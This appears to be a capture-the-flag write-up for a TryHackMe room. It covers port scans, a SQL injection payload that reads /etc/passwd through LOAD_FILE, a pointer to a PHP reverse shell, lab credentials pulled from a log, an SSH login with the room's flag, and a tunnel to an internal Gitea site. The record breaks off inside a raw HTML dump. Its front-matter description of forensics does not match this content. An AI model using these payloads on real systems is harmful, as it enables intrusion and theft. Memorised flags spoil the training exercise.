---
title: "TryHackMe: year of the dog"
author: NeoVirex
categories: [TryHackMe]
tags: [thm]
render_with_liquid: false
media_subpath: /images/tryhackme/tryhackme_year_of_the_dog/
image:
  path: room_img.png
description: The challenge focuses on Linux forensics and log analysis to investigate suspicious activity. You'll analyze command history and system files to uncover how the attacker operated and maintained access.
---


# Year of the Dog

## Reconnaissance

### Rustscan

```jsx
└─$ rustscan -a 10.10.243.114       

[~] The config file is expected to be at "/home/neo/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.10.243.114:22
Open 10.10.243.114:80
[~] Starting Script(s)
[~] Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-16 13:30 EDT                                
Initiating Ping Scan at 13:30                                                                         
Scanning 10.10.243.114 [4 ports]                                                                      
Completed Ping Scan at 13:30, 0.40s elapsed (1 total hosts)                                           
Initiating Parallel DNS resolution of 1 host. at 13:30                                                
Completed Parallel DNS resolution of 1 host. at 13:30, 0.02s elapsed                                  
DNS resolution of 1 IPs took 0.02s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]      
Initiating SYN Stealth Scan at 13:30                                                                  
Scanning 10.10.243.114 [2 ports]                                                                      
Discovered open port 22/tcp on 10.10.243.114
Discovered open port 80/tcp on 10.10.243.114
Completed SYN Stealth Scan at 13:30, 0.73s elapsed (2 total ports)
Nmap scan report for 10.10.243.114
Host is up, received echo-reply ttl 61 (0.46s latency).
Scanned at 2025-03-16 13:30:54 EDT for 1s

PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 61
80/tcp open  http    syn-ack ttl 61

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 1.26 seconds
           Raw packets sent: 6 (240B) | Rcvd: 3 (116B)
```

### namp

```jsx
─$ nmap -sV -sC -vv -p22,80 10.10.243.114     
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-16 13:33 EDT
NSE: Loaded 156 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 13:33
Completed NSE at 13:33, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 13:33
Completed NSE at 13:33, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 13:33
Completed NSE at 13:33, 0.00s elapsed
Initiating Ping Scan at 13:33
Scanning 10.10.243.114 [4 ports]
Completed Ping Scan at 13:33, 0.42s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 13:33
Completed Parallel DNS resolution of 1 host. at 13:33, 0.00s elapsed
Initiating SYN Stealth Scan at 13:33
Scanning 10.10.243.114 [2 ports]
Discovered open port 80/tcp on 10.10.243.114
Discovered open port 22/tcp on 10.10.243.114
Completed SYN Stealth Scan at 13:33, 0.42s elapsed (2 total ports)
Initiating Service scan at 13:33
Scanning 2 services on 10.10.243.114
Completed Service scan at 13:34, 6.88s elapsed (2 services on 1 host)
NSE: Script scanning 10.10.243.114.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 13:34
Completed NSE at 13:34, 12.08s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 13:34
Completed NSE at 13:34, 1.64s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 13:34
Completed NSE at 13:34, 0.00s elapsed
Nmap scan report for 10.10.243.114
Host is up, received echo-reply ttl 61 (0.40s latency).
Scanned at 2025-03-16 13:33:57 EDT for 21s

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 61 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e4:c9:dd:9b:db:95:9e:fd:19:a9:a6:0d:4c:43:9f:fa (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDrxDlZxvJUZk2qXaeBdjHxfM3MSGpZ8H6zPqgarnP3K806zE1Y/CryyT4wgIZYomtV8wUWHlFkuqbWjcKcM1MWcPjzGWfPZ2wHTNgUkHvBWZ+fxoX8vJoC6wfpifa7bSMaOItFWSLnMGOXigHbF6dPNyP+/kXAJE+tg9TurrTKaPiL6u+02ITeVUuLWsjwlLDJAnu1zDhPONR2b7WTcU/zQxHUYZiHpHn5eBtXpCZPZyfOZ+828ibobM/CAHIBZqJsYksAe5RbtDw7Vdw/8OtYuo4Koz8C2kBoWCHvsmyDfwZ57E2Ycss4JG5j7fMt7sI+lh/NHE+/7zrXdH/4njCD
|   256 c3:fc:10:d8:78:47:7e:fb:89:cf:81:8b:6e:f1:0a:fd (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMlni4gM6dVkvfGeMy6eg/18HsCYvvFhbpycXiGYM3fitNhTXW4WpMpr8W/0y2FszEB6TGD93ib/lCTsBOQG5Uw=
|   256 27:68:ff:ef:c0:68:e2:49:75:59:34:f2:bd:f0:c9:20 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICQIHukp5WpajvhF4juRWmL2+YtbN9HbhgLScgqYNien
80/tcp open  http    syn-ack ttl 61 Apache httpd 2.4.29 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Canis Queue
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 13:34
Completed NSE at 13:34, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 13:34
Completed NSE at 13:34, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 13:34
Completed NSE at 13:34, 0.00s elapsed
Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.95 seconds
           Raw packets sent: 6 (240B) | Rcvd: 3 (116B)
                                                                                                      
┌──(neo㉿lab)-[~]

```

## Service Enumeration

![Screenshot From 2025-03-16 13-34-32.png](img1.png)

## Web Application Analysis

## Vulnerability Scanning

it has a SQL 

## Exploit & Initial Access

```jsx
' UNION SELECT null,LOAD_FILE('/etc/passwd')-- -
```

### after i sql

> Where we queue for the sake of queueing -- like all good Brits!

You are number root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin syslog:x:102:106::/home/syslog:/usr/sbin/nologin messagebus:x:103:107::/nonexistent:/usr/sbin/nologin _apt:x:104:65534::/nonexistent:/usr/sbin/nologin mysql:x:105:108:MySQL Server,,,:/nonexistent:/bin/false lxd:x:106:65534::/var/lib/lxd/:/bin/false uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin dnsmasq:x:108:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin landscape:x:109:114::/var/lib/landscape:/usr/sbin/nologin sshd:x:110:65534::/run/sshd:/usr/sbin/nologin pollinate:x:111:1::/var/cache/pollinate:/bin/false dylan:x:1000:1000:dylan,,,:/home/dylan:/bin/bash in the queue
> 

### p3 revers shell code

```jsx
https://github.com/pentestmonkey/php-reverse-shell
```

## Privilege Escalation

### 1 set

```jsx
ls
user.txt
work_analysis
$ user.txt
work_analysis
$ user.txt
work_analysis
$ cat user.txt
cat: user.txt: Permission denied
$

```

#### i find the passwd in the work_analysis file using the user name dylan i search it and the password came up

```jsx
$
$ cat work_analysis | grep -i dylan
Sep  5 20:52:57 staging-server sshd[39218]: Invalid user dylanLabr4d0rs4L1f3 from 192.168.1.142 port 45624                                                         
Sep  5 20:53:03 staging-server sshd[39218]: Failed password for invalid user dylanLabr4d0rs4L1f3 from 192.168.1.142 port 45624 ssh2                                
Sep  5 20:53:04 staging-server sshd[39218]: Connection closed by invalid user dylanLabr4d0rs4L1f3 192.168.1.142 port 45624 [preauth]   

```

#### **i login to the ssh gorm the ssh i you have user access**

```jsx
└─$ ssh dylan@10.10.132.206       
The authenticity of host '10.10.132.206 (10.10.132.206)' can't be established.
ED25519 key fingerprint is SHA256:COVMyuuQk4t2tjR365JBufQ/zuW3VAnAka5yRg+KQnI.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.132.206' (ED25519) to the list of known hosts.
dylan@10.10.132.206's password: 
Permission denied, please try again.
dylan@10.10.132.206's password: 
Permission denied, please try again.
dylan@10.10.132.206's password: 

        __   __                       __   _   _            ____              
        \ \ / /__  __ _ _ __    ___  / _| | |_| |__   ___  |  _ \  ___   __ _ 
         \ V / _ \/ _` | '__|  / _ \| |_  | __| '_ \ / _ \ | | | |/ _ \ / _` |
          | |  __/ (_| | |    | (_) |  _| | |_| | | |  __/ | |_| | (_) | (_| |
          |_|\___|\__,_|_|     \___/|_|    \__|_| |_|\___| |____/ \___/ \__, |
                                                                        |___/ 

dylan@year-of-the-dog:~$ ls
user.txt  work_analysis                                                                             
dylan@year-of-the-dog:~$ cat user.txt
THM{OTE3MTQyNTM5NzRiN2VjNTQyYWM2M2Ji}                                                               
dylan@year-of-the-dog:~$       
```

#### username dylan password  Labr4d0rs4L1f3

### 2 set

#### identified processes and finding the [localhost](http://localhost) is running in port 3000

```jsx
└─$ ssh -fN -L 3000:127.0.0.1:3000 dylan@10.10.210.115

dylan@10.10.210.115's password: 
                                                                    
┌──(neo㉿neo)-[~]
└─$ netstat -plnt                   
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.1:3000          0.0.0.0:*               LISTEN      3501/ssh            
tcp6       0      0 ::1:3000                :::*                    LISTEN      3501/ssh            
                                                                    
┌──(neo㉿neo)-[~]
└─$ nc localhost 3000

```

![1__kMcUhKuUcxbGegp5sHYWg.webp](img2.webp)

![1_95NDUEYkqmnvGIf0NZU-AA.webp](img3.webp)

![1_aMp41JVmj7K40lBH4z5Czw.webp](img4.webp)

#### for the 2FA Read this https://docs.gitea.com/next/development/api-usage

#### before you run it open burp and turn on the interspter

```jsx
  
$ curl --request GET --url http://dylan:Labr4d0rs4L1f3@localhost:3000 --proxy 127.0.0.1:8080
```

![Screenshot From 2025-03-22 07-24-28.png](img5.png)

- without the proxying in burp
    
    ```jsx
    $ curl --request GET --url http://dylan:Labr4d0rs4L1f3@localhost:3000
    
    <!DOCTYPE html>
    <html lang="en-US" class="theme-gitea">
    <head data-suburl="">
            <meta charset="utf-8">
            <meta name="viewport" content="width=device-width, initial-scale=1">
            <meta http-equiv="x-ua-compatible" content="ie=edge">
            <title>Dylan Anderson - Dashboard -  Year of the Dog </title>
            <link rel="manifest" href="/manifest.json" crossorigin="use-credentials">
            <meta name="theme-color" content="#6cc644">
            <meta name="author" content="Gitea - Git with a cup of tea" />
            <meta name="description" content="Gitea (Git with a cup of tea) is a painless self-hosted Git service written in Go" />
            <meta name="keywords" content="go,git,self-hosted,gitea">
            <meta name="referrer" content="no-referrer" />
            <meta name="_csrf" content="Rb5vCo_TxYtK7GLTVJmmaRKsrXY6MTc0MjY0MjMyNDg0MjM0NzQ1MQ" />
    
                    <meta name="_uid" content="1" />
    
                    <meta name="_context_uid" content="1" />
    
                    <meta name="_search_limit" content="15" />
    
            <script>
                    window.config = {
                            AppVer: '1.13.0\u002bdev-542-gbc11caff9',
                            AppSubUrl: '',
                            StaticUrlPrefix: '',
                            UseServiceWorker:  true ,
                            csrf: 'Rb5vCo_TxYtK7GLTVJmmaRKsrXY6MTc0MjY0MjMyNDg0MjM0NzQ1MQ',
                            HighlightJS: false,
                            SimpleMDE: false,
                            Tribute: false,
                            U2F: false,
                            Heatmap: true,
                            heatmapUser: 'Dylan',
                            NotificationSettings: {
                                    MinTimeout:  10000 ,
                                    TimeoutStep:   10000 ,
                                    MaxTimeout:  60000 ,
                                    EventSourceUpdateTime:  10000 ,
                            },
                            PageIsProjects: false,
          
                    };
            </script>
            <link rel="icon" href="/img/favicon.svg" type="image/svg+xml">
            <link rel="alternate icon" href="/img/favicon.png" type="image/png">
            <link rel="mask-icon" href="/img/gitea-safari.svg" color="#609926">
            <link rel="fluid-icon" href="/img/gitea-lg.png" title="Year of the Dog">
    
            <link rel="stylesheet" href="/css/index.css?v=b1ac68db93a054fae10cb84624df1582">
            <noscript>
                    <style>
                            .dropdown:hover > .menu { display: block; }
                            .ui.secondary.menu .dropdown.item > .menu { margin-top: 0; }
                    </style>
            </noscript>
            <style class="list-search-style"></style>
    
            <meta property="og:title" content="Year of the Dog">
            <meta property="og:type" content="website" />
            <meta property="og:image" content="/img/gitea-lg.png" />
            <meta property="og:url" content="http://localhost:3000/" />
            <meta property="og:description" content="Gitea (Git with a cup of tea) is a painless self-hosted Git service written in Go">
    
    <meta property="og:site_name" content="Year of the Dog" />
    
    </head>
    <body>
    
            <div class="full height">
                    <noscript>This website works better with JavaScript.</noscript>
    
                            <div class="ui top secondary stackable main menu following bar light">
                                    <div class="ui container" id="navbar">
            <div class="item brand" style="justify-content: space-between;">
                    <a href="/">
                            <img class="ui mini image" src="/img/gitea-sm.png">
                    </a>
                    <div class="ui basic icon button mobile-only" id="navbar-expand-toggle">
                            <i class="sidebar icon"></i>
                    </div>
            </div>
    
                    <a class="item active" href="/">Dashboard</a>
    
                    <a class="item " href="/issues">Issues</a>
    
                    <a class="item " href="/pulls">Pull Requests</a>
    
                    <a class="item " href="/milestones">Milestones</a>
    
                    <a class="item " href="/explore/repos">Explore</a>
    
                    <div class="right stackable menu">
                            <a href="/notifications" class="item poping up" data-content='Notifications' data-variation="tiny inverted">
                                    <span class="text">
                                            <span class="fitted"><svg viewBox="0 0 16 16" class="svg octicon-bell" width="16" height="16" aria-hidden="true"><path d="M8 16a2 2 0 001.985-1.75c.017-.137-.097-.25-.235-.25h-3.5c-.138 0-.252.113-.235.25A2 2 0 008 16z"/><path fill-rule="evenodd" d="M8 1.5A3.5 3.5 0 004.5 5v2.947c0 .346-.102.683-.294.97l-1.703 2.556a.018.018 0 00-.003.01l.001.006c0 .002.002.004.004.006a.017.017 0 00.006.004l.007.001h10.964l.007-.001a.016.016 0 00.006-.004.016.016 0 00.004-.006l.001-.007a.017.017 0 00-.003-.01l-1.703-2.554a1.75 1.75 0 01-.294-.97V5A3.5 3.5 0 008 1.5zM3 5a5 5 0 0110 0v2.947c0 .05.015.098.042.139l1.703 2.555A1.518 1.518 0 0113.482 13H2.518a1.518 1.518 0 01-1.263-2.36l1.703-2.554A.25.25 0 003 7.947V5z"/></svg></span>
                                            <span class="sr-mobile-only">Notifications</span>
    
                                            <span class="ui red label hidden notification_count">
                                                    0
                                            </span>
                                    </span>
                            </a>
    
                            <div class="ui dropdown jump item poping up" data-content="Create…" data-variation="tiny inverted">
                                    <span class="text">
                                            <span class="fitted"><svg viewBox="0 0 16 16" class="svg octicon-plus" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M8 2a.75.75 0 01.75.75v4.5h4.5a.75.75 0 010 1.5h-4.5v4.5a.75.75 0 01-1.5 0v-4.5h-4.5a.75.75 0 010-1.5h4.5v-4.5A.75.75 0 018 2z"/></svg></span>
                                            <span class="sr-mobile-only">Create…</span>
                                            <span class="fitted not-mobile"><svg viewBox="0 0 16 16" class="svg octicon-triangle-down" width="16" height="16" aria-hidden="true"><path d="M4.427 7.427l3.396 3.396a.25.25 0 00.354 0l3.396-3.396A.25.25 0 0011.396 7H4.604a.25.25 0 00-.177.427z"/></svg></span>
                                    </span>
                                    <div class="menu">
                                            <a class="item" href="/repo/create">
                                                    <span class="fitted"><svg viewBox="0 0 16 16" class="svg octicon-plus" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M8 2a.75.75 0 01.75.75v4.5h4.5a.75.75 0 010 1.5h-4.5v4.5a.75.75 0 01-1.5 0v-4.5h-4.5a.75.75 0 010-1.5h4.5v-4.5A.75.75 0 018 2z"/></svg></span> New Repository
                                            </a>
                                            <a class="item" href="/repo/migrate">
                                                    <span class="fitted"><svg viewBox="0 0 16 16" class="svg octicon-repo-push" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M1 2.5A2.5 2.5 0 013.5 0h8.75a.75.75 0 01.75.75v3.5a.75.75 0 01-1.5 0V1.5h-8a1 1 0 00-1 1v6.708A2.492 2.492 0 013.5 9h3.25a.75.75 0 010 1.5H3.5a1 1 0 100 2h5.75a.75.75 0 010 1.5H3.5A2.5 2.5 0 011 11.5v-9zm13.23 7.79a.75.75 0 001.06-1.06l-2.505-2.505a.75.75 0 00-1.06 0L9.22 9.229a.75.75 0 001.06 1.061l1.225-1.224v6.184a.75.75 0 001.5 0V9.066l1.224 1.224z"/></svg></span> New Migration
                                            </a>
    
                                            <a class="item" href="/org/create">
                                                    <span class="fitted"><svg viewBox="0 0 16 16" class="svg octicon-organization" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M1.5 14.25c0 .138.112.25.25.25H4v-1.25a.75.75 0 01.75-.75h2.5a.75.75 0 01.75.75v1.25h2.25a.25.25 0 00.25-.25V1.75a.25.25 0 00-.25-.25h-8.5a.25.25 0 00-.25.25v12.5zM1.75 16A1.75 1.75 0 010 14.25V1.75C0 .784.784 0 1.75 0h8.5C11.216 0 12 .784 12 1.75v12.5c0 .085-.006.168-.018.25h2.268a.25.25 0 00.25-.25V8.285a.25.25 0 00-.111-.208l-1.055-.703a.75.75 0 11.832-1.248l1.055.703c.487.325.779.871.779 1.456v5.965A1.75 1.75 0 0114.25 16h-3.5a.75.75 0 01-.197-.026c-.099.017-.2.026-.303.026h-3a.75.75 0 01-.75-.75V14h-1v1.25a.75.75 0 01-.75.75h-3zM3 3.75A.75.75 0 013.75 3h.5a.75.75 0 010 1.5h-.5A.75.75 0 013 3.75zM3.75 6a.75.75 0 000 1.5h.5a.75.75 0 000-1.5h-.5zM3 9.75A.75.75 0 013.75 9h.5a.75.75 0 010 1.5h-.5A.75.75 0 013 9.75zM7.75 9a.75.75 0 000 1.5h.5a.75.75 0 000-1.5h-.5zM7 6.75A.75.75 0 017.75 6h.5a.75.75 0 010 1.5h-.5A.75.75 0 017 6.75zM7.75 3a.75.75 0 000 1.5h.5a.75.75 0 000-1.5h-.5z"/></svg></span> New Organization
                                            </a>
    
                                    </div>
                            </div>
    
                            <div class="ui dropdown jump item poping up" tabindex="-1" data-content="Profile and Settings…" data-variation="tiny inverted">
                                    <span class="text">
                                            <img class="ui tiny avatar image" width="24" height="24" src="/user/avatar/Dylan/-1">
                                            <span class="sr-only">Profile and Settings…</span>
                                            <span class="mobile-only">Dylan</span>
                                            <span class="fitted not-mobile" tabindex="-1"><svg viewBox="0 0 16 16" class="svg octicon-triangle-down" width="16" height="16" aria-hidden="true"><path d="M4.427 7.427l3.396 3.396a.25.25 0 00.354 0l3.396-3.396A.25.25 0 0011.396 7H4.604a.25.25 0 00-.177.427z"/></svg></span>
                                    </span>
                                    <div class="menu user-menu" tabindex="-1">
                                            <div class="ui header">
                                                    Signed in as <strong>Dylan</strong>
                                            </div>
    
                                            <div class="divider"></div>
                                            <a class="item" href="/Dylan">
                                                    <svg viewBox="0 0 16 16" class="svg octicon-person" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M10.5 5a2.5 2.5 0 11-5 0 2.5 2.5 0 015 0zm.061 3.073a4 4 0 10-5.123 0 6.004 6.004 0 00-3.431 5.142.75.75 0 001.498.07 4.5 4.5 0 018.99 0 .75.75 0 101.498-.07 6.005 6.005 0 00-3.432-5.142z"/></svg>
                                                    Profile
                                            </a>
                                            <a class="item" href="/Dylan?tab=stars">
                                                    <svg viewBox="0 0 16 16" class="svg octicon-star" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M8 .25a.75.75 0 01.673.418l1.882 3.815 4.21.612a.75.75 0 01.416 1.279l-3.046 2.97.719 4.192a.75.75 0 01-1.088.791L8 12.347l-3.766 1.98a.75.75 0 01-1.088-.79l.72-4.194L.818 6.374a.75.75 0 01.416-1.28l4.21-.611L7.327.668A.75.75 0 018 .25zm0 2.445L6.615 5.5a.75.75 0 01-.564.41l-3.097.45 2.24 2.184a.75.75 0 01.216.664l-.528 3.084 2.769-1.456a.75.75 0 01.698 0l2.77 1.456-.53-3.084a.75.75 0 01.216-.664l2.24-2.183-3.096-.45a.75.75 0 01-.564-.41L8 2.694v.001z"/></svg>
                                                    Starred
                                            </a>
                                            <a class=" item" href="/user/settings">
                                                    <svg viewBox="0 0 16 16" class="svg octicon-tools" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M5.433 2.304A4.494 4.494 0 003.5 6c0 1.598.832 3.002 2.09 3.802.518.328.929.923.902 1.64v.008l-.164 3.337a.75.75 0 11-1.498-.073l.163-3.33c.002-.085-.05-.216-.207-.316A5.996 5.996 0 012 6a5.994 5.994 0 012.567-4.92 1.482 1.482 0 011.673-.04c.462.296.76.827.76 1.423v2.82c0 .082.041.16.11.206l.75.51a.25.25 0 00.28 0l.75-.51A.25.25 0 009 5.282V2.463c0-.596.298-1.127.76-1.423a1.482 1.482 0 011.673.04A5.994 5.994 0 0114 6a5.996 5.996 0 01-2.786 5.068c-.157.1-.209.23-.207.315l.163 3.33a.75.75 0 11-1.498.074l-.164-3.345c-.027-.717.384-1.312.902-1.64A4.496 4.496 0 0012.5 6a4.494 4.494 0 00-1.933-3.696c-.024.017-.067.067-.067.16v2.818a1.75 1.75 0 01-.767 1.448l-.75.51a1.75 1.75 0 01-1.966 0l-.75-.51A1.75 1.75 0 015.5 5.282V2.463c0-.092-.043-.142-.067-.159zm.01-.005z"/></svg>
                                                    Settings
                                            </a>
                                            <a class="item" target="_blank" rel="noopener noreferrer" href="https://docs.gitea.io">
                                                    <svg viewBox="0 0 16 16" class="svg octicon-question" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M8 1.5a6.5 6.5 0 100 13 6.5 6.5 0 000-13zM0 8a8 8 0 1116 0A8 8 0 010 8zm9 3a1 1 0 11-2 0 1 1 0 012 0zM6.92 6.085c.081-.16.19-.299.34-.398.145-.097.371-.187.74-.187.28 0 .553.087.738.225A.613.613 0 019 6.25c0 .177-.04.264-.077.318a.956.956 0 01-.277.245c-.076.051-.158.1-.258.161l-.007.004a7.728 7.728 0 00-.313.195 2.416 2.416 0 00-.692.661.75.75 0 001.248.832.956.956 0 01.276-.245 6.3 6.3 0 01.26-.16l.006-.004c.093-.057.204-.123.313-.195.222-.149.487-.355.692-.662.214-.32.329-.702.329-1.15 0-.76-.36-1.348-.863-1.725A2.76 2.76 0 008 4c-.631 0-1.155.16-1.572.438-.413.276-.68.638-.849.977a.75.75 0 101.342.67z"/></svg>
                                                    Help
                                            </a>
    
                                                    <div class="divider"></div>
    
                                                    <a class=" item" href="/admin">
                                                            <i class="icon settings"></i>
                                                            Site Administration
                                                    </a>
    
                                            <div class="divider"></div>
                                            <a class="item link-action" href data-url="/user/logout" data-redirect="/">
                                                    <svg viewBox="0 0 16 16" class="svg octicon-sign-out" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M2 2.75C2 1.784 2.784 1 3.75 1h2.5a.75.75 0 010 1.5h-2.5a.25.25 0 00-.25.25v10.5c0 .138.112.25.25.25h2.5a.75.75 0 010 1.5h-2.5A1.75 1.75 0 012 13.25V2.75zm10.44 4.5H6.75a.75.75 0 000 1.5h5.69l-1.97 1.97a.75.75 0 101.06 1.06l3.25-3.25a.75.75 0 000-1.06l-3.25-3.25a.75.75 0 10-1.06 1.06l1.97 1.97z"/></svg>
                                                    Sign Out
                                            </a>
                                    </div>
                            </div>
                    </div>
    
    </div>
    
                            </div>
    
    <div class="dashboard feeds">
            <div class="dashboard-navbar">
            <div class="ui secondary stackable menu">
                    <div class="item">
                            <div class="ui floating dropdown link jump">
                                    <span class="text">
                                            <img class="ui avatar image" src="/user/avatar/Dylan/-1" title="Dylan" width="28" height="28">
                                            Dylan
                                            <i class="dropdown icon"></i>
                                    </span>
                                    <div class="context user overflow menu" tabindex="-1">
                                            <div class="ui header">
                                                    Switch Dashboard Context
                                            </div>
                                            <div class="scrolling menu items">
                                                    <a class="active selected item" href="/">
                                                            <img class="ui avatar image" src="/user/avatar/Dylan/-1" width="28" height="28">
                                                            Dylan
                                                    </a>
    
                                            </div>
    
                                            <a class="item" href="/org/create">
                                                    <svg viewBox="0 0 16 16" class="svg octicon-plus" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M8 2a.75.75 0 01.75.75v4.5h4.5a.75.75 0 010 1.5h-4.5v4.5a.75.75 0 01-1.5 0v-4.5h-4.5a.75.75 0 010-1.5h4.5v-4.5A.75.75 0 018 2z"/></svg>&nbsp;&nbsp;&nbsp;New Organization
                                            </a>
    
                                    </div>
                            </div>
                    </div>
    
            </div>
    </div>
    <div class="ui divider"></div>
    
            <div class="ui container">
    
                    <div class="ui mobile reversed stackable grid">
                            <div class="ui container ten wide column">
    
                                            <div id="user-heatmap" style="padding-right: 40px">
            <activity-heatmap :locale="locale" :suburl="suburl" :user="heatmapUser">
                    <div slot="loading">
                            <div class="ui active centered inline indeterminate text loader" id="loading-heatmap">Loading Heatmap…</div>
                    </div>
            </activity-heatmap>
    </div>
    
                                            <div class="ui divider"></div>
    
            <div class="news">
                    <div class="ui left">
                            <img class="ui avatar image" src="/user/avatar/Dylan/-1" alt="">
                    </div>
                    <div class="ui grid">
                            <div class="ui fourteen wide column">
                                    <div class="">
                                            <p>
    
                                                            <a href="/Dylan" title="Dylan Anderson">Dylan</a>
    
                                                            created repository <a href="/Dylan/Test-Repo" rel="nofollow">Dylan/Test-Repo</a>
    
                                            </p>
    
                                            <p class="text italic light grey"><span class="time-since" title="Sat, 05 Sep 2020 20:06:14 UTC">4 years ago</span></p>
                                    </div>
                            </div>
                            <div class="ui two wide right aligned column">
                                    <span class="text grey"><svg viewBox="0 0 16 16" class="svg octicon-repo" width="32" height="32" aria-hidden="true"><path fill-rule="evenodd" d="M2 2.5A2.5 2.5 0 014.5 0h8.75a.75.75 0 01.75.75v12.5a.75.75 0 01-.75.75h-2.5a.75.75 0 110-1.5h1.75v-2h-8a1 1 0 00-.714 1.7.75.75 0 01-1.072 1.05A2.495 2.495 0 012 11.5v-9zm10.5-1V9h-8c-.356 0-.694.074-1 .208V2.5a1 1 0 011-1h8zM5 12.25v3.25a.25.25 0 00.4.2l1.45-1.087a.25.25 0 01.3 0L8.6 15.7a.25.25 0 00.4-.2v-3.25a.25.25 0 00-.25-.25h-3.5a.25.25 0 00-.25.25z"/></svg></span>
                            </div>
                    </div>
                    <div class="ui divider"></div>
            </div>
    
                            </div>
                            <div id="app" class="six wide column">
            <repo-search
            :search-limit="searchLimit"
            :suburl="suburl"
            :uid="uid"
            :more-repos-link="'/Dylan'"
    
            :organizations="[
    
            ]"
            :is-organization="false"
            :organizations-total-count="0"
            :can-create-organization="true"
    
            inline-template
            v-cloak
            >
            <div>
                    <div v-if="!isOrganization" class="ui two item tabable menu">
                            <a :class="{item: true, active: tab === 'repos'}" @click="changeTab('repos')">Repository</a>
                            <a :class="{item: true, active: tab === 'organizations'}" @click="changeTab('organizations')">Organization</a>
                    </div>
                    <div v-show="tab === 'repos'" class="ui tab active list dashboard-repos">
                            <h4 class="ui top attached header">
                                    Repositories <span class="ui grey label">${reposTotalCount}</span>
    
                                    <div class="ui right">
                                            <a class="poping up" :href="suburl + '/repo/create'" data-content="New Repository" data-variation="tiny inverted" data-position="left center">
                                                    <i class="plus icon"></i>
                                                    <span class="sr-only">New Repository</span>
                                            </a>
                                    </div>
    
                            </h4>
                            <div class="ui attached secondary segment repos-search">
                                    <div class="ui fluid right action left icon input" :class="{loading: isLoading}">
                                            <input @input="searchRepos(reposFilter)" v-model="searchQuery" ref="search" placeholder="Find a repository…">
                                            <i class="search icon"></i>
                                            <div class="ui dropdown button" title="Other Filters">
                                                    <i class="icon filter"></i>
                                                    <div class="menu">
                                                            <div class="item">
                                                                    <a @click="toggleArchivedFilter()">
                                                                            <div class="ui checkbox" id="archivedFilterCheckbox" title="Showing both archived and unarchived" v-if="archivedFilter === 'both'">
                                                                                    <input type="checkbox">
                                                                                    <label><i class="archive icon archived-icon"></i>Archived</label>
                                                                            </div>
